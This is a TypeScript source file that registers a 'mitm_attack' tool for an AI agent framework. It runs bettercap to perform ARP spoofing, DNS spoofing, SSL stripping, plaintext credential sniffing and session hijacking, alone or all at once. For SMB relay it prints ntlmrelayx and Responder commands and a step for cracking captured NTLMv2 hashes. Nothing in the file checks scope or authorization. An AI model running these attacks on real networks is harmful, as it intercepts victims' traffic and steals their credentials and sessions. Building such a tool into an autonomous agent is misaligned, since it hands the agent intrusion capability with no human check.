export * as MitmAttackTool from "./mitm-attack"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "mitm_attack"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "MITM attack: 'arp_spoof', 'dns_spoof', 'ssl_strip', 'cred_harvest', 'session_hijack', 'smb_relay', 'full' (all-in-one via bettercap)",
  }),
  interface: Schema.String.annotate({ description: "Network interface (e.g. eth0, wlan0)" }),
  target_ip: Schema.String.pipe(Schema.optional).annotate({ description: "Target IP for ARP spoofing" }),
  gateway_ip: Schema.String.pipe(Schema.optional).annotate({ description: "Gateway/router IP. Default: auto-detect." }),
  domain: Schema.String.pipe(Schema.optional).annotate({ description: "Domain for DNS spoofing" }),
  fake_ip: Schema.String.pipe(Schema.optional).annotate({ description: "Fake IP for DNS spoofing. Default: your IP." }),
  duration: Schema.Number.pipe(Schema.optional).annotate({ description: "Duration in seconds. Default: 60." }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `Man-in-the-Middle attacks via bettercap. ARP spoofing to intercept traffic, DNS spoofing to redirect victims, SSL stripping for credential capture, session cookie hijacking, and SMB relay. Full mode runs all attacks simultaneously. Uses bettercap and mitm6 for IPv6 DNS spoofing. Essential for network-position attacks.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
            const duration = input.duration ?? 60
            const iface = input.interface

            switch (input.action) {
              case "arp_spoof": {
                if (!input.target_ip) return { output: "ERROR: 'target_ip' required for arp_spoof." }
                const args = ["-iface", iface, "-eval", `set arp.spoof.targets ${input.target_ip}; set arp.spoof.fullduplex true; arp.spoof on; sleep ${duration}; arp.spoof off`]
                const cmd = ChildProcess.make("bettercap", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "bettercap failed. Install: apt install bettercap" }
              }

              case "dns_spoof": {
                if (!input.domain) return { output: "ERROR: 'domain' required for dns_spoof." }
                const fakeIp = input.fake_ip ?? "YOUR_IP"
                const args = ["-iface", iface, "-eval", `set arp.spoof.targets ${input.target_ip ?? "127.0.0.1/24"}; set dns.spoof.domains ${input.domain}; set dns.spoof.address ${fakeIp}; arp.spoof on; dns.spoof on; sleep ${duration}`]
                const cmd = ChildProcess.make("bettercap", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "bettercap failed." }
              }

              case "ssl_strip":
              case "cred_harvest":
              case "session_hijack":
              case "full": {
                const evalParts: string[] = []
                if (input.target_ip) { evalParts.push(`set arp.spoof.targets ${input.target_ip}; arp.spoof on`) }
                if (input.action === "ssl_strip" || input.action === "full") { evalParts.push("set http.proxy.script bettercap/http-ui-proxy/http-ui-proxy.js; http.proxy on") }
                if (input.action === "cred_harvest" || input.action === "full") { evalParts.push("set net.sniff.local true; net.sniff on; set net.sniff.filter tcp port 80 or tcp port 21 or tcp port 25") }
                if (input.action === "session_hijack" || input.action === "full") { evalParts.push("api.rest.on; set http.proxy on") }
                evalParts.push(`sleep ${duration}`)
                const args = ["-iface", iface, "-eval", evalParts.join("; ")]
                const cmd = ChildProcess.make("bettercap", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "bettercap failed. Install: apt install bettercap" }
              }

              case "smb_relay": {
                return {
                  output: `SMB Relay via ntlmrelayx (Impacket):
ntlmrelayx.py -tf targets.txt -smb2support

Or via bettercap:
bettercap -iface ${iface} -eval "set arp.spoof.targets ${input.target_ip ?? "TARGET"}; arp.spoof on; set smb2.support true"

For Responder (credential capture):
responder -I ${iface} -wrf

Capture NTLMv2 hashes and crack with:
hash_crack hash_type=netntlmv2 hash=CAPTURED_HASH`,
                }
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: arp_spoof, dns_spoof, ssl_strip, cred_harvest, session_hijack, smb_relay, full` }
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "MITM attack failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/mitm-attack",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
